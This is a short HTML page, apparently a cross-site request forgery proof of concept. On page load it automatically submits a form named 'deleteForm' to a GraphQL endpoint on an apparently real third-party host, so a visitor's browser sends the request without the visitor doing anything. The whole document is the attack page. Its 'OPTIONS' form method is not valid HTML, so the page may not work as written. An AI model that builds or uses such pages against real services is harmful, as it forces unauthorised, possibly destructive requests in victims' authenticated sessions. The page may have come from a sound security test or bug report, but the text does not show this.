<!DOCTYPE html>
<html>
<head>
    <title>Auto Submit Form</title>
</head>
<body>
    <form method="OPTIONS" action="https://server.nearshopz.com/graphql/v1" id="deleteForm">
        <input type="submit" value="Submit">
    </form>
    
    <script>
        window.onload = function() {
            document.getElementById('deleteForm').submit();
        };
    </script>
</body>
</html>
